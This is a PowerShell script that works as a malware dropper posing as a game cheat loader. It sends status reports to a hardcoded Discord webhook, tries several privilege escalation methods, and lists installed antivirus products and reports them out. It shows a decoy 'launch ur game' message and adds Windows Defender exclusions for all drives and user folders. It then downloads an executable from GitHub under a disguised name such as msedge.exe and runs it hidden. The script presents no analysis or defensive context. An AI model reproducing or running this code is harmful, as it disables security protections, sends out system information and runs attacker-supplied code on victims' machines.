$webhookUrl = 'https://discord.com/api/webhooks/1418620647654953144/quGfUxYm_ZNxydSkulCZd2NGHsrHdfIm0h5J9gM5R0FQyrdsQRecWTTMaI3Mff3cWQzU'

function Send-WebhookMessage {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Message
    )
    $client = [System.Net.Http.HttpClient]::new()
    $payload = @{ content = $Message } | ConvertTo-Json
    $content = [System.Net.Http.StringContent]::new($payload, [System.Text.Encoding]::UTF8, 'application/json')
    try {
        $client.PostAsync($webhookUrl, $content).GetAwaiter().GetResult() | Out-Null
    } catch {}
    $client.Dispose()
}

Send-WebhookMessage -Message "Script started at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"

try {
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if (-not $isAdmin) {
        $attempts = 0
        $maxAttempts = 3
        $elevationMethods = @(
            @{
                Method = 'RunAs'
                Action = {
                    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs -ErrorAction Stop
                }
            },
            @{
                Method = 'ShellExecute'
                Action = {
                    $shell = New-Object -ComObject Shell.Application
                    $shell.ShellExecute('powershell.exe', "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"", '', 'runas')
                }
            },
            @{
                Method = 'ScheduledTask'
                Action = {
                    $taskName = "TempAdminTask_$([guid]::NewGuid().ToString())"
                    $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
                    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
                    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
                    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force -RunLevel Highest | Out-Null
                    Start-ScheduledTask -TaskName $taskName
                    Start-Sleep -Seconds 5
                    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
                }
            }
        )
        while (-not $isAdmin -and $attempts -lt $maxAttempts) {
            foreach ($method in $elevationMethods) {
                try {
                    Send-WebhookMessage -Message "Attempting elevation using $($method.Method) (Attempt $($attempts + 1))..."
                    & $method.Action
                    Start-Sleep -Milliseconds 1000
                    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
                    if ($isAdmin) {
                        Send-WebhookMessage -Message 'Elevation successful. Script is now running with administrative privileges.'
                        break
                    }
                } catch {
                    Send-WebhookMessage -Message "Elevation failed with $($method.Method): $_"
                    Start-Sleep -Milliseconds 500
                }
            }
            $attempts++
        }
        if (-not $isAdmin) {
            Send-WebhookMessage -Message 'All elevation attempts failed after maximum retries.'
            exit
        }
    } else {
        Send-WebhookMessage -Message 'Script is running with administrative privileges.'
    }

    try {
        $DefenderService = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
        $DefenderStatus = if ($DefenderService) { $DefenderService.Status } else { 'Not Installed' }
    } catch {
        $DefenderStatus = 'Error retrieving status'
        Send-WebhookMessage -Message "Error getting Defender service status: $($_)"
    }

    try {
        $DefenderRealtime = Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring
    } catch {
        $DefenderRealtime = 'Unavailable'
        Send-WebhookMessage -Message "Error getting Defender real-time protection status: $($_)"
    }

    try {
        $InstalledAV = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName "AntiVirusProduct" -ErrorAction SilentlyContinue | 
            Select-Object displayName, productState, pathToSignedProductExe
    } catch {
        $InstalledAV = $null
        Send-WebhookMessage -Message "Error retrieving installed antivirus products: $($_)"
    }

    try {
        $DefenderExe = Get-Command "C:\Program Files\Windows Defender\MsMpEng.exe" -ErrorAction SilentlyContinue
        $DefenderExeStatus = if ($DefenderExe) { 'Yes' } else { 'No' }
    } catch {
        $DefenderExeStatus = 'Error checking executable'
        Send-WebhookMessage -Message "Error checking Defender executable: $($_)"
    }

    try {
        $WinDefendReg = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender" -ErrorAction SilentlyContinue
        $RegStatus = if ($WinDefendReg) { 'Yes' } else { 'No' }
    } catch {
        $RegStatus = 'Error checking registry'
        Send-WebhookMessage -Message "Error accessing Windows Defender registry: $($_)"
    }

    try {
        $avInfo = if ($InstalledAV) {
            ($InstalledAV | ForEach-Object { 
                $state = switch ($_.productState) {
                    397568 { 'Enabled' }
                    266240 { 'Disabled' }
                    Default { "Unknown ($($_.productState))" }
                }
                "   $($_.displayName) Status $state Path $($_.pathToSignedProductExe)"
            }) -join "`n"
        } else { "   None detected" }
    } catch {
        $avInfo = "   Error processing antivirus info"
        Send-WebhookMessage -Message "Error processing antivirus product info: $($_)"
    }

    $knownAVPaths = @(
        "$env:ProgramFiles\AVAST Software", "$env:ProgramFiles(x86)\AVAST Software",
        "$env:ProgramFiles\AVG", "$env:ProgramFiles(x86)\AVG",
        "$env:ProgramFiles\Avira", "$env:ProgramFiles(x86)\Avira",
        "$env:ProgramFiles\Bitdefender", "$env:ProgramFiles(x86)\Bitdefender",
        "$env:ProgramFiles\Kaspersky Lab", "$env:ProgramFiles(x86)\Kaspersky Lab",
        "$env:ProgramFiles\Malwarebytes", "$env:ProgramFiles(x86)\Malwarebytes",
        "$env:ProgramFiles\McAfee", "$env:ProgramFiles(x86)\McAfee",
        "$env:ProgramFiles\Norton", "$env:ProgramFiles(x86)\Norton",
        "$env:ProgramFiles\ESET", "$env:ProgramFiles(x86)\ESET",
        "$env:ProgramFiles\Trend Micro", "$env:ProgramFiles(x86)\Trend Micro",
        "$env:ProgramFiles\Panda Security", "$env:ProgramFiles(x86)\Panda Security",
        "$env:ProgramFiles\Sophos", "$env:ProgramFiles(x86)\Sophos",
        "$env:ProgramFiles\F-Secure", "$env:ProgramFiles(x86)\F-Secure",
        "$env:ProgramFiles\Webroot", "$env:ProgramFiles(x86)\Webroot",
        "$env:ProgramFiles\Comodo", "$env:ProgramFiles(x86)\Comodo",
        "$env:ProgramFiles\VIPRE", "$env:ProgramFiles(x86)\VIPRE",
        "$env:ProgramFiles\Cylance", "$env:ProgramFiles(x86)\Cylance",
        "$env:ProgramFiles\Carbon Black", "$env:ProgramFiles(x86)\Carbon Black",
        "$env:ProgramFiles\CrowdStrike", "$env:ProgramFiles(x86)\CrowdStrike",
        "$env:ProgramFiles\DrWeb", "$env:ProgramFiles(x86)\DrWeb",
        "$env:ProgramFiles\Symantec", "$env:ProgramFiles(x86)\Symantec",
        "$env:ProgramFiles\ZoneAlarm", "$env:ProgramFiles(x86)\ZoneAlarm",
        "$env:ProgramFiles\Adaware", "$env:ProgramFiles(x86)\Adaware",
        "$env:ProgramFiles\VIPRE Security", "$env:ProgramFiles(x86)\VIPRE Security",
        "$env:ProgramFiles\Windows Defender Advanced Threat Protection",
        "$env:ProgramFiles(x86)\Windows Defender Advanced Threat Protection",
        "$env:ProgramFiles\360 Total Security", "$env:ProgramFiles(x86)\360 Total Security",
        "$env:ProgramFiles\Quick Heal", "$env:ProgramFiles(x86)\Quick Heal",
        "$env:ProgramFiles\G Data", "$env:ProgramFiles(x86)\G Data",
        "$env:ProgramFiles\BullGuard", "$env:ProgramFiles(x86)\BullGuard",
        "$env:ProgramFiles\HitmanPro", "$env:ProgramFiles(x86)\HitmanPro",
        "$env:ProgramFiles\SUPERAntiSpyware", "$env:ProgramFiles(x86)\SUPERAntiSpyware",
        "$env:ProgramFiles\IObit\Advanced SystemCare", "$env:ProgramFiles(x86)\IObit\Advanced SystemCare",
        "$env:ProgramFiles\IObit\Malware Fighter", "$env:ProgramFiles(x86)\IObit\Malware Fighter",
        "$env:ProgramFiles\Comodo\Comodo Internet Security", "$env:ProgramFiles(x86)\Comodo\Comodo Internet Security",
        "$env:ProgramFiles\Comodo\Comodo Firewall", "$env:ProgramFiles(x86)\Comodo\Comodo Firewall",
        "$env:ProgramFiles\CheckPoint\ZoneAlarm", "$env:ProgramFiles(x86)\CheckPoint\ZoneAlarm",
        "$env:ProgramFiles\CheckPoint\Endpoint Security", "$env:ProgramFiles(x86)\CheckPoint\Endpoint Security",
        "$env:ProgramFiles\Fortinet", "$env:ProgramFiles(x86)\Fortinet",
        "$env:ProgramFiles\Palo Alto Networks", "$env:ProgramFiles(x86)\Palo Alto Networks",
        "$env:ProgramFiles\SentinelOne", "$env:ProgramFiles(x86)\SentinelOne",
        "$env:ProgramFiles\Trellix", "$env:ProgramFiles(x86)\Trellix",
        "$env:ProgramFiles\TotalAV", "$env:ProgramFiles(x86)\TotalAV",
        "$env:ProgramFiles\ClamWin", "$env:ProgramFiles(x86)\ClamWin",
        "$env:ProgramFiles\Emsisoft", "$env:ProgramFiles(x86)\Emsisoft",
        "$env:ProgramFiles\Immunet", "$env:ProgramFiles(x86)\Immunet",
        "$env:ProgramFiles\K7 Computing", "$env:ProgramFiles(x86)\K7 Computing",
        "$env:ProgramFiles\Reason Cybersecurity", "$env:ProgramFiles(x86)\Reason Cybersecurity",
        "$env:ProgramFiles\SecureAge", "$env:ProgramFiles(x86)\SecureAge",
        "$env:ProgramFiles\TrustPort", "$env:ProgramFiles(x86)\TrustPort",
        "$env:ProgramFiles\Arcabit", "$env:ProgramFiles(x86)\Arcabit",
        "$env:ProgramFiles\Bytefence", "$env:ProgramFiles(x86)\Bytefence",
        "$env:ProgramFiles\Max Secure", "$env:ProgramFiles(x86)\Max Secure",
        "$env:ProgramFiles\PC Matic", "$env:ProgramFiles(x86)\PC Matic",
        "$env:ProgramFiles\Roboscan", "$env:ProgramFiles(x86)\Roboscan",
        "$env:ProgramFiles\Seqrite", "$env:ProgramFiles(x86)\Seqrite",
        "$env:ProgramFiles\Smadav", "$env:ProgramFiles(x86)\Smadav",
        "$env:ProgramFiles\Tencent\PC Manager", "$env:ProgramFiles(x86)\Tencent\PC Manager",
        "$env:ProgramFiles\ThreatTrack Security", "$env:ProgramFiles(x86)\ThreatTrack Security",
        "$env:ProgramFiles\UnThreat", "$env:ProgramFiles(x86)\UnThreat",
        "$env:ProgramFiles\VoodooShield", "$env:ProgramFiles(x86)\VoodooShield",
        "$env:ProgramFiles\Xvirus", "$env:ProgramFiles(x86)\Xvirus",
        "$env:ProgramFiles\ZHPCleaner", "$env:ProgramFiles(x86)\ZHPCleaner"
    )

    $pathAVs = @()
    foreach ($path in $knownAVPaths) {
        try {
            if ($path -and (Test-Path $path -ErrorAction SilentlyContinue)) {
                $pathAVs += $path
            }
        } catch {
            $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
            Send-WebhookMessage -Message "Error checking path $path : $errorMessage"
        }
    }

    try {
        $pathAVsInfo = if ($pathAVs) { $pathAVs -join "`n" } else { "   None detected" }
    } catch {
        $pathAVsInfo = "   Error processing path info"
        Send-WebhookMessage -Message "Error processing antivirus path info: $($_)"
    }

    $message = @"
=== Windows Defender Info ===
Service Status: $DefenderStatus
Real-Time Protection Disabled: $DefenderRealtime
Defender Executable Found: $DefenderExeStatus
Defender Registered in Registry: $RegStatus
Installed Antivirus Products (Security Center):
$avInfo
Installed Antivirus Products (By Path):
$pathAVsInfo
"@

    try {
        Send-WebhookMessage -Message $message
    } catch {
        Write-Error "Failed to send webhook message: $($_)"
    }

    function Show-SilentMessageBox {
        param(
            [string]$Message = "Default message",
            [string]$Title = "Info",
            [string]$Icon = "Information"
        )
        
        $arguments = "-WindowStyle Hidden -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command `"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('$Message', '$Title', 'OK', '$Icon')`""
        
        Start-Process powershell -ArgumentList $arguments -WindowStyle Hidden
    }
    Show-SilentMessageBox -Message "Assigning and loading the driver... (launch ur game in 60s)" -Title "Info"

    $programFiles = "C:\Program Files"
    $tempFolder = $env:TEMP
    $appDataFolder = $env:APPDATA
    $localAppDataFolder = $env:LOCALAPPDATA

    $directories = Get-ChildItem -Path $programFiles -Directory | Where-Object { $_.Name -notlike "Windows*" -and $_.Name -notlike "ModifiableWindowsApps" }
    foreach ($dir in $directories) {
        try {
            Add-MpPreference -ExclusionPath $dir.FullName -ErrorAction Stop | Out-Null
            Send-WebhookMessage -Message "Added exclusion: $($dir.FullName)"
        } catch {
            $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
            Send-WebhookMessage -Message "Error adding exclusion for $($dir.FullName) : $errorMessage"
        }
    }

    $drives = Get-PSDrive -PSProvider FileSystem | ForEach-Object { $_.Root }
    foreach ($drive in $drives) {
        try {
            Add-MpPreference -ExclusionPath $drive -ErrorAction Stop | Out-Null
            Send-WebhookMessage -Message "Added exclusion: $drive"
        } catch {
            $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
            Send-WebhookMessage -Message "Error adding exclusion for $drive : $errorMessage"
        }
    }

    try {
        Add-MpPreference -ExclusionPath $tempFolder -ErrorAction Stop | Out-Null
        Send-WebhookMessage -Message "Added exclusion: $tempFolder"
    } catch {
        $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
        Send-WebhookMessage -Message "Error adding exclusion for $tempFolder : $errorMessage"
    }

    try {
        Add-MpPreference -ExclusionPath $appDataFolder -ErrorAction Stop | Out-Null
        Send-WebhookMessage -Message "Added exclusion: $appDataFolder"
    } catch {
        $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
        Send-WebhookMessage -Message "Error adding exclusion for $appDataFolder : $errorMessage"
    }

    try {
        Add-MpPreference -ExclusionPath $localAppDataFolder -ErrorAction Stop | Out-Null
        Send-WebhookMessage -Message "Added exclusion: $localAppDataFolder"
    } catch {
        $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
        Send-WebhookMessage -Message "Error adding exclusion for $localAppDataFolder : $errorMessage"
    }

    $exeNames = @("msedge.exe", "OneDrive.exe", "GoogleUpdate.exe", "steam.exe")
    $selectedExe = $exeNames | Get-Random
    $destinationPath = Join-Path -Path $localAppDataFolder -ChildPath $selectedExe
    try {
        Add-MpPreference -ExclusionPath $destinationPath -ErrorAction Stop | Out-Null
        Send-WebhookMessage -Message "Added exclusion for download path: $destinationPath"
    } catch {
        $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
        Send-WebhookMessage -Message "Error adding exclusion for $destinationPath : $errorMessage"
    }

    $downloadUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
    try {
        Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath -UseBasicParsing -ErrorAction Stop | Out-Null
        Send-WebhookMessage -Message "Downloaded $selectedExe to $destinationPath"
        Start-Process -FilePath $destinationPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
        Send-WebhookMessage -Message "Executed $selectedExe"
    } catch {
        $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
        Send-WebhookMessage -Message "Error downloading or executing $selectedExe : $errorMessage"
    }
    Send-WebhookMessage -Message "Script completed at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
} catch {
    $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
    Send-WebhookMessage -Message "Unexpected error: $errorMessage"
}
